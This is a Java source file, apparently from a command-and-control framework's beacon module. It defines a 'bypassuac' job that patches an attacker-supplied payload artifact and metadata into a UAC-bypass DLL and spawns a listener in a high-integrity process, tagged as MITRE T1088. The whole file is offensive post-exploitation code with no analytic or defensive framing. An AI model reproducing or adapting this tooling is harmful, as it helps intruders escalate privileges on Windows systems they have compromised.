package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Listener;
import common.Packer;

public class BypassUACJob
        extends Job {
    protected String name;
    protected String listener;
    protected String artifact;

    public BypassUACJob(TaskBeacon tasker, String name, String listener, byte[] artifact) {
        super(tasker);
        this.name = name;
        this.listener = listener;
        this.artifact = CommonUtils.bString(artifact);
    }

    @Override
    public String getDescription() {
        return "Tasked beacon to spawn " + Listener.getListener(this.listener) + " in a high integrity process";
    }

    @Override
    public String getShortDescription() {
        return "bypassuac";
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/bypassuac.x64.dll";
        }
        return "resources/bypassuac.dll";
    }

    @Override
    public String getPipeName() {
        return "bypassuac";
    }

    @Override
    public String getTactic() {
        return "T1088";
    }

    @Override
    public int getCallbackType() {
        return 0;
    }

    @Override
    public int getWaitTime() {
        return 30000;
    }

    @Override
    public byte[] fix(byte[] mydll) {
        String artifactz = CommonUtils.pad(this.artifact, '\u0000', 24576);
        mydll = CommonUtils.patch(mydll, "ARTIFACT ABCDEFGHIJKLMNOPQRSTUVWXYZ", artifactz);
        Packer packit = new Packer();
        packit.little();
        packit.addInt(this.artifact.length());
        packit.addString(this.name, 28);
        String metadata = CommonUtils.pad(CommonUtils.bString(packit.getBytes()), '\u0000', 64);
        mydll = CommonUtils.patch(mydll, "META ABCDEFGHIJKLMNOPQRSTUVWXYZ", metadata);
        return mydll;
    }
}

